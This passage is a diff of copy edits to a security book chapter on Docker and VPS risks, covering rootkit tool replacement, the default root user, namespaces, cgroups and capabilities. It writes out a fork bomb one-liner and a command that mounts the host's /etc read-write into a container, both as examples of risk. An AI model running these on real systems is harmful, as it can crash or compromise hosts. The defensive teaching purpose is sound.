+* Replace `md5sum` so that it contains sums for the files that were replaced, including `md5sum` itself. However, if an administrator ran `rpm -V` or `debsums -c` (Debian, Ubuntu) it would not be affected by a modified `md5sum`.
 
-If an attacker wants their actions to be invisible, they may try replacing the likes of `ps`, `pstree`, `top`, `ls` and possibly `netstat` or `ss`, and/or many other tools that reveal information about the system, if they are trying to hide network activity from the host.
+If an attacker wants their actions to be invisible, they may try replacing the likes of `ps`, `pstree`, `top`, `ls`, `netstat` or `ss`, and/or many other tools that reveal information about the system, particulalry if they are trying to hide network activity from the host.
 
-Taking things further, an attacker may load a kernel module that modifies the `readdir()` call and the `proc` filesystem so that any changes on the file system are untrustworthy, or if going to the length of loading custom modules, everything can be done from kernel space which is invisible until reboot.
+Taking things a step further, an attacker may load a kernel module that modifies the `readdir()` call and the `proc` filesystem so that any changes on the file system are untrustworthy. If they go so far as to load custom modules, everything can be done from kernel space, which is invisible until reboot.
 
-Without visibility, an attacker can access your system(s) and, alter, [copy](https://github.com/m57/dnsteal), modify information without you knowing they did it. Even launch DoS attacks without you noticing anything before it is to late.
+Without defender visibility, an attacker can access your system(s) and, alter, [copy](https://github.com/m57/dnsteal), and/or modify information without you knowing they did so. They may even launch DoS attacks without you noticing anything before it is to late.
 
 ### Docker {#vps-identify-risks-docker}
 
-With the continual push for shorter development cycles, combined with continuous delivery, cloud and virtual based infrastructure, containers have become an important part of the continuous delivery pipeline. Docker has established itself as a top contender in this space.
+With the continual push for shorter development cycles, combined with continuous delivery, as well as cloud and virtual based infrastructure, containers have become an important part of the continuous delivery pipeline. Docker has established itself as a top contender in this space.
 
-Many of Dockers defaults favour ease of use over security, in saying that, Docker's security considerations follow closely. After working with Docker, the research I have performed in writing these sections on Docker security, and in having the chance to [discuss](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) many of my concerns and preconceived ideas with the Docker Security team lead Diogo Mónica over this period, it is my belief that by default Docker containers, infrastructure and orchestration provide better security than running your applications in Virtual Machines (VMs). Just be careful when comparing containers with VMs, as this is analogous with comparing apples with oranges.
+Many of Docker's defaults favour ease of use over security, in saying that, Docker's security considerations follow closely. After working with Docker, the research I have performed in writing these sections on Docker security, while having the chance to [discuss](http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/) many of my concerns and ideas with the Docker Security team lead, Diogo Mónica, it is my belief that, by default, Docker containers, infrastructure and orchestration provide better security than running your applications in Virtual Machines (VMs). Just be careful when comparing containers with VMs, as this is analogous with comparing apples to oranges.
 
-The beauty in terms of security that Docker provides is immense configurability to improve the security many times more than the defaults. In order to do this, you will have to invest some time and effort into learning about the possible issues, features and how to configure them. It is this visibility that I have attempted to create in these sections on Docker security.
+Docker security provides immense configurability to improve its security posture many times over better than defaults. In order to do this properly, you will have to invest some time and effort into learning about the possible issues, features, and how to configure them. I have attempted to illuminate this specifically in these sections on Docker security.
 
-Docker security is similar to VPS security, except there is a much larger attack surface, due to running many containers with many different packages, many of which do not receive timely security updates, as noted by [banyan](https://www.banyanops.com/blog/analyzing-docker-hub/) and [the morning paper](https://blog.acolyer.org/2017/04/03/a-study-of-security-vulnerabilities-on-docker-hub/).
+Docker security is similar to VPS security, except there is a much larger attack surface. This is most noteworthy when running many containers with different packages, many of which do not receive timely security updates, as noted by [banyan](https://www.banyanops.com/blog/analyzing-docker-hub/) and [the morning paper](https://blog.acolyer.org/2017/04/03/a-study-of-security-vulnerabilities-on-docker-hub/).
 
-A monolithic kernel such as the Linux kernel, containing tens of millions of lines of code, which are reachable from untrusted applications via all sorts of networking, USB, driver APIs Has a huge attack surface. Adding Docker into the mix has the potential to expose all these vulnerabilities to each and every running container, and its applications within, thus making the attack surface of the kernel grow exponentially.
+A monolithic kernel, such as the Linux kernel, which contains tens of millions of lines of code, and can be reached by untrusted applications via all sorts of networking, USB, and driver APIs, has a huge attack surface. Adding Docker into the mix has the potential to expose all these vulnerabilities to each and every running container, and its applications within, thus making the attack surface of the kernel grow exponentially.
 
-Docker leverage's many features that have been in the Linux kernel for years, which provide a lot of security enhancements out of the box. The Docker Security Team are working hard to add additional tooling and techniques to further harden their components, this has become obvious as I have investigated many of them. You still need to know what all the features, tooling and techniques are, and how to use them, in order to determine whether your container security is adequate for your needs.
+Docker leverage's many features that have been in the Linux kernel for years, which provide many security enhancements out of the box. The Docker Security Team are working hard to add additional tooling and techniques to further harden their components, this has become obvious as I have investigated many of them. You still need to know what all the features, tooling and techniques are, and how to use them, in order to determine whether your container security is adequate for your needs.
 
-From the [Docker overview](https://docs.docker.com/engine/understanding-docker/), it says: “_Docker provides the ability to package and run an application in a loosely isolated environment_”. Later in the same document it says: "_Each container is an isolated and secure application platform, but can be given access to resources running in a different host or container_" leaving the "loosely" out. Then it goes on to say: “_Encapsulate your applications (and supporting components) into Docker containers_”. The meaning of encapsulate is to enclose, but If we are only loosely isolating, then we’re not really enclosing are we? I will address this concern in the following Docker sections and subsections.
+From the [Docker overview](https://docs.docker.com/engine/understanding-docker/), it states: “_Docker provides the ability to package and run an application in a loosely isolated environment_”. Later in the same document it says: "_Each container is an isolated and secure application platform, but can be given access to resources running in a different host or container_" leaving the "loosely" out. It continues to say: “_Encapsulate your applications (and supporting components) into Docker containers_”. The meaning of encapsulate is to enclose, but Ii we are only loosely isolating, then we’re not really enclosing are we? I will address this concern in the following Docker sections and subsections.
 
-To start with, I am going to discuss many areas where we can improve container security, then at the end of this Docker section I will discuss why application security is far more of a concern than container security.
+To start with, I am going to discuss many areas where we can improve container security. At the end of this Docker section I will discuss why application security is of far more concern than container security.
 
 #### Consumption from [Registries](https://docs.docker.com/registry/)
 ![](images/ThreatTags/average-verywidespread-easy-moderate.png)
 
-Similar to [Consuming Free and Open Source](#web-applications-identify-risks-consuming-free-and-open-source) from the Web Applications chapter, many of us trust the images on docker hub without much consideration to the possible defective packages within. There have been quite a few reports with varying numbers of vulnerable images as noted by Banyan and "the morning paper" mentioned above.
+Similar to [Consuming Free and Open Source](#web-applications-identify-risks-consuming-free-and-open-source) from the Web Applications chapter, many of us trust the images on Docker hub without much consideration for the possibly defective packages within. There have been quite a few reports with varying numbers of vulnerable images as noted by Banyan and "the morning paper" mentioned above.
 
-The Docker Registry [project](https://github.com/docker/distribution) is an open-source server side application that lets you store and distribute Docker images. You could run your own registry as part of your organisations Continuous Integration (CI) / Continuous Delivery (CD) pipeline. Some of the public known instances of the registry are:
+The Docker Registry [project](https://github.com/docker/distribution) is an open-source server side application that lets you store and distribute Docker images. You could run your own registry as part of your organisation's Continuous Integration (CI) / Continuous Delivery (CD) pipeline. Some of the public known instances of the registry are:
 
 * [Docker Hub](https://hub.docker.com/explore/)
 * EC2 Container Registry
@@ -1216,59 +1213,59 @@ The Docker Registry [project](https://github.com/docker/distribution) is an open
 #### Doppelganger images
 ![](images/ThreatTags/average-common-average-severe.png)
 
-Beware of doppelganger images that will be available for all to consume, similar to [doppelganger packages](#web-applications-countermeasures-consuming-free-and-open-source-keeping-safe-doppelganger-packages) that we discuss in the Web Applications chapter. These can contain a huge number of packages and code to hide malware in a Docker image.
+Beware of doppelganger images that will be available for all to consume, similar to [doppelganger packages](#web-applications-countermeasures-consuming-free-and-open-source-keeping-safe-doppelganger-packages) that we discuss in the Web Applications chapter. These can contain a huge number of packages and code that can be used to hide malware in a Docker image.
 
 #### The Default User is Root
 ![](images/ThreatTags/easy-common-veryeasy-moderate.png)
 
-What is worse, dockers default is to run containers, and all commands / processes within a container as root. This can be seen by running the following command from the [CIS_Docker_1.13.0_Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf):
+What is worse, Docker's default is to run containers, and all commands / processes within a container as root. This can be seen by running the following command from the [CIS_Docker_1.13.0_Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf):
 
 {title="Query User running containers", linenos=off, lang=Bash}
     docker ps --quiet | xargs docker inspect --format '{{ .Id }}: User={{ .Config.User }}'
 
-If you have two containers running and the user has not been specified you will see something like the below, which means your two containers are running as root.
+If you have two containers running, and the user has not been specified, you will see something like the below, which means your two containers are running as root.
 
 {title="Result of user running containers output", linenos=off, lang=Bash}
     <container n Id>: User=
     <container n+1 Id>: User=
 
-Images derived from other images inherit the same user defined in the parent image explicitly or implicitly, so unless the image creator has specifically defined a non root user, the user will default to root. That means, all processes within the container will run as root.
+Images derived from other images inherit the same user defined in the parent image explicitly or implicitly, so unless the image creator has specifically defined a non-root user, the user will default to root. That means all processes within the container will run as root.
 
 #### Docker Host, Engine and Containers
 ![](images/ThreatTags/difficult-uncommon-average-moderate.png)
 
-Considering these processes run as root, and have [indirect access](https://theinvisiblethings.blogspot.co.nz/2012/09/how-is-qubes-os-different-from.html) to most of the Linux Kernel (20+ million lines of code written by humans) APIs such as networking, USB, storage stacks, and others via System calls, the situation may look bleak.
+Considering that these processes run as root, and have [indirect access](https://theinvisiblethings.blogspot.co.nz/2012/09/how-is-qubes-os-different-from.html) to most of the Linux Kernel (20+ million lines of code written by humans) APIs, such as networking, USB, storage stacks, and others via System calls, the situation may look bleak.
 
 ![](images/HypervisorVsContainers.png)
 
-[System calls](http://man7.org/linux/man-pages/man2/syscalls.2.html) are how programmes access the kernel to perform tasks. This attack surface is huge, and all before any security is added on top in the form of LXC, or libcontainer (now [opencontainers/runc](https://github.com/opencontainers/runc)), or [Linux Security Modules (LSM)](#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules) such as AppArmor or SELinux, which are often seen as an annoyance and just disabled like many other forms of security.
+[System calls](http://man7.org/linux/man-pages/man2/syscalls.2.html) are how programmes access the kernel to perform tasks. This attack surface is huge, and all before any security is added on top in the form of LXC,  libcontainer (now [opencontainers/runc](https://github.com/opencontainers/runc)), or [Linux Security Modules (LSM)](#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules) such as AppArmor or SELinux. These are often seen as an annoyance and just disabled like many other forms of security.
 
-If you run a container, you may have to install `kmod`, then run `lsmod` in the container and also on the host system, you will see that the same modules are loaded, this is because as mentioned, the container shares the host kernel, so there is not a lot between processes within the container and the host kernel, and considering as mentioned above, the processes within the container may be running as root also, it will pay for you to get a good understanding of the security features Docker provides and how to employ them.
+If you run a container, you may have to install `kmod`, then run `lsmod` in the container, and also on the host system. You will see that the same modules are loaded, this is because as mentioned, the container shares the host kernel, so there is not a lot between processes within the container and the host kernel. As mentioned above, the processes within the container may be running as root as well, it pays for you to have a good understanding of the security features Docker provides, and how to employ them.
 
-The [Seccomp section below](#vps-identify-risks-docker-docker-engine-and-containers-seccomp) discusses Dockers attempt to put a stop to some System calls accessing the kernel APIs. There are also many other features that Docker has added or leveraged in terms of mitigating a lot of this potential abuse. So although the situation initially looks bad, Docker has done a lot to improve it.
+The [Seccomp section below](#vps-identify-risks-docker-docker-engine-and-containers-seccomp) discusses Docker's attempt to put a stop to some System calls accessing the kernel APIs. There are also many other features that Docker has added or leveraged in terms of mitigating a lot of this potential abuse. Although the situation initially looks bad, Docker has done a lot to improve it.
 
 As you can see in the above image, the host kernel is open to receiving potential abuse from containers. Make sure you keep it patched. We will now walk though many areas of potential abuse. The [countermeasures](#vps-countermeasures-docker) sections offer information, advice, and techniques for further improving Docker security.
 
 ##### Namespaces {#vps-identify-risks-docker-docker-host-engine-and-containers-namespaces}
 
-The first place to read for solid background on Linux kernel namespaces is the [man-page](http://man7.org/linux/man-pages/man7/namespaces.7.html), otherwise I would just have to repeat what is there. A lot of what is to follow around namespaces requires some knowledge from the namespaces man-page, so do your self a favour and read it first.
+The first place to read for solid background on Linux kernel namespaces is the [man-page](http://man7.org/linux/man-pages/man7/namespaces.7.html), otherwise I'd just be repeating what is there. A lot of what follows about namespaces requires some knowledge from the namespaces man-page, so do yourself a favour and read it first.
 
-Linux kernel namespaces started to be added between 2.6.15 (January 2006) and 2.6.26 (July 2008)
+Linux kernel namespaces were first added between 2.6.15 (January 2006) and 2.6.26 (July 2008).
 
-According to the namespaces man page, IPC, network and UTS namespace support was available from kernel version 3.0, mount, PID and user namespace support was available from kernel version 3.8 (February 2013), cgroup namespace support was available from kernel version 4.6 (May 2016).
+According to the namespaces man page, IPC, network and UTS namespace support was available from kernel version 3.0, while mount, PID and user namespace support was available from kernel version 3.8 (February 2013), and cgroup namespace support was available from kernel version 4.6 (May 2016).
 
 Each aspect of a container runs in a separate namespace and its access is limited to that namespace.
 
-Docker leverage's the Linux (kernel) namespaces which provide an isolated workspace which wraps a global system resource abstraction that makes it appear to the processes within the namespace that they have their own isolated instance of the global resource. When a container is run, Docker creates a set of namespaces for that container, providing a layer of isolation between containers:
+Docker leverages the Linux (kernel) namespaces which provide an isolated workspace wrapped with a global system resource abstraction. This makes it appear to the processes within the namespace that they have their own isolated instance of the global resource. When a container is run, Docker creates a set of namespaces for that container, providing a layer of isolation between containers:
 
 1. `mnt`: (Mount) Provides filesystem isolation by managing filesystems and mount points. The `mnt` namespace allows a container to have its own isolated set of mounted filesystems, the propagation modes can be one of the following: [`r`]`shared`, [`r`]`slave` or [`r`]`private`. The `r` means recursive.
     
-    If you run the following command, then the hosts mounted `host-path` is [shared](https://docs.docker.com/engine/reference/run/#volume-shared-filesystems) with all others that mount `host-path`. Any changes made to the mounted data will be propagated to those that use the `shared` mode propagation. Using `slave` means only the master (`host-path`) is able to propagate changes, not vice-versa. Using `private` which is the default, will ensure no changes can be propagated.
+    If you run the following command, then the host's mounted `host-path` is [shared](https://docs.docker.com/engine/reference/run/#volume-shared-filesystems) with all others that mount `host-path`. Any changes made to the mounted data will be propagated to those that use the `shared` mode propagation. Using `slave` means only the master (`host-path`) is able to propagate changes, not vice-versa. Using `private` which is the default, will ensure no changes can be propagated.
     
     {title="mounting volumes in shared mode propagation", linenos=off, lang=bash}
         docker run <run arguments> --volume=[host-path:]<container-path>:[z][r]shared <container image name or id> <command> <args...>
     
-    If you omit the `host-path` you can [see the host path](https://docs.docker.com/engine/tutorials/dockervolumes/#locating-a-volume) that was mounted by running the following command:
+    If you omit the `host-path` you can [see the host path](https://docs.docker.com/engine/tutorials/dockervolumes/#locating-a-volume) that was mounted when running the following command:
     
     {title="Query", linenos=off, lang=bash}
         docker inspect <name or id of container>
@@ -1289,7 +1286,7 @@ Docker leverage's the Linux (kernel) namespaces which provide an isolated worksp
         ]
         ...
     
-    An empty string for Mode means it is set to its default of read-write. This means for example that a container can mount sensitive host system directories such as `/`, `/boot`, `/etc` (as seen in [Review Password Strategies](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies)), `/lib`, `/proc`, `/sys`, along with the rest discussed in the [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section, if that advice was not followed, if it was you have some defence in depth working for you, and although Docker may have mounted a directory as read-write, the underlying mount may be read-only, thus stopping the container from being able to modify files in these locations on the host system. If the host does not have the above directories mounted with constrained permissions, then we are relying on the user that runs any given Docker container mounting a sensitive host volume to mount it as read-only. For example, after the following command has been run, users within the container can modify files in the hosts `/etc` directory:
+    An empty string for Mode means that it is set to its read-write default. For example, a container can mount sensitive host system directories such as `/`, `/boot`, `/etc` (as seen in [Review Password Strategies](#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies)), `/lib`, `/proc`, `/sys`, along with the rest as discussed in the [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section, particularly if that advice was not followed. If it was followed, you have some defence in depth working for you, and although Docker may have mounted a directory as read-write, the underlying mount may be read-only, thus stopping the container from being able to modify files in these locations on the host system. If the host does not have the above directories mounted with constrained permissions, then we are relying on the user running any given Docker container that mounts a sensitive host volume to mount it as read-only. For example, after the following command has been run, users within the container can modify files in the hosts `/etc` directory:
     
     {title="Vulnerable mount", linenos=off, lang=bash}
         docker run -it --rm -v /etc:/hosts-etc --name=lets-mount-etc ubuntu
@@ -1309,10 +1306,10 @@ Docker leverage's the Linux (kernel) namespaces which provide an isolated worksp
           }
         ]
     
-    Also keep in mind that by default the user in the container unless otherwise specified is root, and that is the same root user that is on the host system.
+    Also keep in mind that, by default, the user in the container, unless otherwise specified, is root, the same root user as on the host system.
     
     {#vps-identify-risks-docker-docker-host-engine-and-containers-namespaces-mnt-labelling}
-    Labelling systems such as [Linux Security Modules (LSM)](#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules) require that the contents of a volume mounted into a container be [labelled](https://docs.docker.com/engine/tutorials/dockervolumes/#volume-labels). This can be done by adding the `z` (as seen in above example) or `Z` suffix to the volume mount. The `z` suffix instructs Docker that you intend to share the mounted volume with other containers, and in doing so, Docker applies a shared content label. Alternatively if you provide the `Z` suffix, Docker applies a private unshared label, which means only the current container can use the mounted volume. Further details can be found at the [dockervolumes documentation](https://docs.docker.com/engine/tutorials/dockervolumes/#volume-labels). This is something to keep in mind if you are using LSM and have a process inside your container that is unable to use the mounted data.  
+    Labelling systems such as [Linux Security Modules (LSM)](#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules) require that the contents of a volume mounted into a container be [labelled](https://docs.docker.com/engine/tutorials/dockervolumes/#volume-labels). This can be done by adding the `z` (as seen in above example) or `Z` suffix to the volume mount. The `z` suffix instructs Docker to share the mounted volume with other containers, and in so doing, Docker applies a shared content label. Alternatively, if you provide the `Z` suffix, Docker applies a private unshared label, which means only the current container can use the mounted volume. Further details can be found at the [dockervolumes documentation](https://docs.docker.com/engine/tutorials/dockervolumes/#volume-labels). This is something to keep in mind if you are using LSM, and have a process inside your container that is unable to use the mounted data.  
     `--volumes-from` allows you to specify a data volume from another container.
     
     You can also [mount](https://linux.die.net/man/8/mount) your Docker container mounts on the host by doing the following:
@@ -1326,11 +1323,11 @@ Docker leverage's the Linux (kernel) namespaces which provide an isolated worksp
     
     `PID` namespaces are [hierarchically nested](https://lwn.net/Articles/531419/) in ancestor-descendant relationships to a depth of up to 32 levels. All `PID` namespaces have a parent namespace, other than the initial root `PID` namespace of the host system. That parent namespace is the `PID` namespace of the process that created the child namespace.
     
-    Within a `PID` namespace, it is possible to access (make system calls to specific `PID`s) all other processes in the same namespace, as well as all processes of descendant namespaces, however processes in a child `PID` namespace cannot see processes that exist in the parent `PID` namespace or further removed ancestor namespaces. The direction any process can access another process in an ancestor/descendant `PID` namespace is one way.
+    Within a `PID` namespace, it is possible to access (make system calls to specific `PID`s) all other processes in the same namespace, as well as all processes of descendant namespaces. However, processes in a child `PID` namespace cannot see processes that exist in the parent `PID` namespace or further removed ancestor namespaces. The direction any process can access another process in an ancestor/descendant `PID` namespace is one way.
     
     Processes in different `PID` namespaces can have the same `PID`, because the `PID` namespace isolates the `PID` number space from other `PID` namespaces.
     
-    Docker takes advantage of `PID` namespaces. Just as you would expect, a Docker container can not access the host system processes, and process ids that are used in the host system can be reused in the container, including `PID` 1, by being reassigned to a process started within the container. The host system can however access all processes within its containers, because as stated above, `PID` namespaces are hierarchically nested in parent-child relationships, so processes in the hosts `PID` namespace can access all processes in their own namespace down to the `PID` namespace that was responsible for starting the process, that is the process within the container in our case.
+    Docker takes advantage of `PID` namespaces. Just as you would expect, a Docker container can not access the host system processes, and process IDs that are used in the host system can be reused in the container, including `PID` 1, by being reassigned to a process started within the container. The host system can however access all processes within its containers, because as stated above, `PID` namespaces are hierarchically nested in parent-child relationships. Processes in the hosts `PID` namespace can access all processes in their own namespace down to the `PID` namespace that was responsible for starting the process, such as the process within the container in our case.
     
     The default behaviour can however be overridden to allow a container to be able to access processes within a sibling container, or the hosts `PID` namespace. [Example](https://docs.docker.com/engine/reference/run/#pid-settings---pid):
     
@@ -1355,13 +1352,13 @@ Docker leverage's the Linux (kernel) namespaces which provide an isolated worksp
         docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]
         docker container unpause myContainer [mySecondContainer...]
     
-3. `net`: (Networking) Provides network isolation by managing the network stack and interfaces. Also essential to allow containers to communicate with the host system and other containers. Network namespaces were introduced into the kernel in 2.6.24, January 2008, with an additional year of development they were considered largely done. The only real concern here is understanding the Docker network modes and communication between containers. This is discussed in the Countermeasures.  
+3. `net`: (Networking) Provides network isolation by managing the network stack and interfaces. It's also essential to allow containers to communicate with the host system and other containers. Network namespaces were introduced into the kernel in 2.6.24, January 2008, with an additional year of development they were considered largely done. The only real concern here is understanding the Docker network modes and communication between containers. This is discussed in the Countermeasures.  
       
 4. `UTS`: (Unix Timesharing System) Provides isolation of kernel and version identifiers.  
     
     UTS is the sharing of a computing resource with many users, a concept introduced in the 1960s/1970s.
     
-    A UTS namespace is the set of identifiers [returned by `uname`](http://man7.org/linux/man-pages/man2/clone.2.html), which include the hostname and the [NIS](#vps-identify-risks-unnecessary-and-vulnerable-services-nis) domainname. Any processes which are not children of the process that requested the clone will not be able to see any changes made to the identifiers of the UTS namespace.
+    A UTS namespace is the set of identifiers [returned by `uname`](http://man7.org/linux/man-pages/man2/clone.2.html), which include the hostname and the [NIS](#vps-identify-risks-unnecessary-and-vulnerable-services-nis) domain name. Any processes which are not children of the process that requested the clone will not be able to see any changes made to the identifiers of the UTS namespace.
     
     If the `CLONE_NEWUTS` constant is set, then the process being created will be created in a new UTS namespace with the hostname and NIS domain name copied and able to be modified independently from the UTS namespace of the calling process.
     
@@ -1377,7 +1374,7 @@ Docker leverage's the Linux (kernel) namespaces which provide an isolated worksp
     
     Although sharing memory segments between processes provide Inter-Process Communications at memory speed, rather than through pipes or worse, the network stack, this produces a significant security concern.
     
-    By default a container does not share the hosts or any other containers IPC namespace. This behaviour can be overridden to allow a (any) container to reuse another containers or the hosts message queues, semaphores, and shared memory via their IPC namespace. [Example](https://docs.docker.com/engine/reference/run/#ipc-settings---ipc):
+    By default a container does not share the host's or any other container's IPC namespace. This behaviour can be overridden to allow a (any) container to reuse another container's or the host's message queues, semaphores, and shared memory via their IPC namespace. [Example](https://docs.docker.com/engine/reference/run/#ipc-settings---ipc):
     
     {title="syntax", linenos=off, lang=bash}
         # Allows a container to reuse another container's IPC namespace.
@@ -1392,7 +1389,7 @@ Docker leverage's the Linux (kernel) namespaces which provide an isolated worksp
         docker run -it --rm --name=container-consumer --ipc=container:container-producer ubuntu
         root@d68ecd6ce69b:/#
     
-    Now find the Ids of the two running containers:  
+    Now find the IDs of the two running containers:  
     
     {title="Query", linenos=off, lang=bash}
         docker inspect --format="{{ .Id }}" container-producer container-consumer
@@ -1401,7 +1398,7 @@ Docker leverage's the Linux (kernel) namespaces which provide an isolated worksp
         609d193403032a49481099b1fc53037fb5352ae148c58c362ab0a020f473c040
         d68ecd6ce69b89253f7ab14de23c9335acaca64d210280590731ce1fcf7a7556
     
-    Now you can see using the command supplied from the [CIS_Docker_1.13.0_Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf) that `container-consumer` is using the IPC namespace of `container-producer`:
+    You can see from using the command supplied by the [CIS_Docker_1.13.0_Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf) that `container-consumer` is using the IPC namespace of `container-producer`:
     
     {title="Query", linenos=off, lang=bash}
         docker ps --quiet --all | xargs docker inspect --format '{{ .Id }}: IpcMode={{ .HostConfig.IpcMode }}'
@@ -1412,73 +1409,73 @@ Docker leverage's the Linux (kernel) namespaces which provide an isolated worksp
     
     When the last process in an IPC namespace terminates, the namespace will be destroyed along with all IPC objects in the namespace.  
     
-6. `user`: Not enabled by default. Allows a process within a container to have a unique range of user and group Ids within the container, known as the subordinate user and group Id feature in the Linux kernel, that do not map to the same user and group Ids of the host, container users to host users are remapped. So for example, if a user within a container is root, which it is by default unless a specific user is defined in the image hierarchy, it will be mapped to a non-privileged user on the host system.  
+6. `user`: Not enabled by default. Allows a process within a container to have a unique range of user and group IDs within the container, known as the subordinate user and group ID feature in the Linux kernel. These do not map to the same user and group IDs of the host, container users to host users are remapped. For example, if a user within a container is root, which it is by default unless a specific user is defined in the image hierarchy, it will be mapped to a non-privileged user on the host system.  
 Docker considers user namespaces to be an advanced feature. There are currently some Docker features that are [incompatible](https://docs.docker.com/engine/reference/commandline/dockerd/#user-namespace-known-restrictions) with using user namespaces, and according to the [CIS Docker 1.13.0 Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf), functionalities that are broken if user namespaces are used. the [Docker engine reference](https://docs.docker.com/engine/reference/commandline/dockerd/#/user-namespace-known-restrictions) provides additional details around known restrictions of user namespaces.  
-If your containers have a predefined non root user, then currently user namespaces should not be enabled, due to possible unpredictable issues and complexities according to "2.8 Enable user namespace support" of the [CIS Docker Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf).  
-The main problem, is that these mappings are performed on the Docker daemon rather than at a per-container level, so it is an all or nothing approach, this may change in the future though.  
+If your containers have a predefined non-root user, then, currently, user namespaces should not be enabled, due to possible unpredictable issues and complexities, according to "2.8 Enable user namespace support" of the [CIS Docker Benchmark](https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf).  
+The problem is that these mappings are performed on the Docker daemon rather than at a per-container level, so it is an all or nothing approach. This may change in the future though.  
 As mentioned, user namespace support is available, but not enabled by default in the Docker daemon.
 
 ##### Control Groups
 
-When a container is started with `docker run` without specifying a cgroup parent, as well as creating the namespaces discussed above, Docker also creates a Control Group (or cgroup) with a set of system resource hierarchies, nested under the default parent `docker` cgroup, also created at container runtime if not already present. You can see how this hierarchy looks in the `/sys/fs/cgroup` pseudo-filesystem in the [Countermeasures](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups-sys-fs-cgroup) section. Cgroups have been available in the Linux kernel since [January 2008 (2.6.24)](https://kernelnewbies.org/Linux_2_6_24#head-5b7511c1e918963d347abc8ed4b75215877d3aa3), and have continued to be improved. Cgroups track, provide the ability to monitor, and configure fine-grained limitations on how much of any resource a set of processes, or in the case of Docker or pure LXC, any given container can use, such as CPU, memory, disk I/O, and network. Many aspects of these resources can be controlled, but by default, any given container can use all of the systems resources, allowing potential DoS.
+When a container is started with `docker run` without specifying a cgroup parent, as well as creating the namespaces discussed above, Docker also creates a Control Group (or cgroup) with a set of system resource hierarchies, nested under the default parent `docker` cgroup, also created at container runtime, if not already present. You can see how this hierarchy looks in the `/sys/fs/cgroup` pseudo-filesystem in the [Countermeasures](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-control-groups-sys-fs-cgroup) section. Cgroups have been available in the Linux kernel since [January 2008 (2.6.24)](https://kernelnewbies.org/Linux_2_6_24#head-5b7511c1e918963d347abc8ed4b75215877d3aa3), and continue to improve. Cgroups track, provide the ability to monitor, and configure, fine-grained limitations on how much of any resource a set of processes, or in the case of Docker or pure LXC, any given container can use, such as CPU, memory, disk I/O, and network. Many aspects of these resources can be controlled, but by default, any given container can use all of the system's resources, allowing potential DoS.
 
 **Fork Bomb from Container**
 
-If an attacker gains access to a container or in a multi-tenanted scenario where being able to run a container by an arbitrary entity is expected, by default, there is nothing stopping a fork bomb  
+If an attacker gains access to a container, or, in a multi-tenanted scenario where being able to run a container by an arbitrary entity is expected, by default, there is nothing stopping a fork bomb  
 `:(){:|:&};:`  
-launched in a container from bringing the host system down. This is because by default there is no limit to the number of processes a container can run.
+launched in a container from bringing the host system down. This is because, by default, there is no limit to the number of processes a container can run.
 
 ##### Capabilities
 
-According to the Linux [man page for capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html), "_Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled_" this is on a per thread basis. So root with all capabilities has privileges to do everything. According to the man page, there are currently 38 capabilities.
+According to the Linux [man page for capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html), "_Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled_". This is on a per thread basis. Root, with all capabilities, has privileges to do everything. According to the man page, there are currently 38 capabilities.
 
-By default, the following capabilities are available to the default user of root within a container, check the man page for the full descriptions of the capabilities. The very knowledgeable Dan Walsh who is one of the experts when it comes to applying least privilege to containers, also [discusses these](http://rhelblog.redhat.com/2016/10/17/secure-your-containers-with-this-one-weird-trick/): `chown`, `dac_override`, `fowner`, `fsetid`, `kill`, `setgid`, `setuid`, `setpcap`, `net_bind_service`, `net_raw`, `sys_chroot`, `mknod`, `audit_write`, `setfcap`. `net_bind_service` for example allows the superuser to bind a socket to a privileged port <1024 if enabled. The Open Container Initiative (OCI) [runC specification](https://github.com/opencontainers/runc/tree/6c22e77604689db8725fa866f0f2ec0b3e8c3a07#running-containers) is considerably more restrictive only enabling three capabilities: `audit_write`, `kill`, `net_bind_service`
+By default, the following capabilities are available to the default user of root within a container, check the man page for the full descriptions of the capabilities. The very knowledgeable Dan Walsh, who is one of the experts when it comes to applying least privilege to containers, also [discusses these](http://rhelblog.redhat.com/2016/10/17/secure-your-containers-with-this-one-weird-trick/): `chown`, `dac_override`, `fowner`, `fsetid`, `kill`, `setgid`, `setuid`, `setpcap`, `net_bind_service`, `net_raw`, `sys_chroot`, `mknod`, `audit_write`, `setfcap`. `net_bind_service` for example allows the superuser to bind a socket to a privileged port <1024 if enabled. The Open Container Initiative (OCI) [runC specification](https://github.com/opencontainers/runc/tree/6c22e77604689db8725fa866f0f2ec0b3e8c3a07#running-containers) is considerably more restrictive, only enabling three capabilities: `audit_write`, `kill`, `net_bind_service`
 
 As stated on the Docker Engine [security page](https://docs.docker.com/engine/security/security/): "_One primary risk with running Docker containers is that the default set of capabilities and mounts given to a container may provide incomplete isolation, either independently, or when used in combination with kernel vulnerabilities._"
 
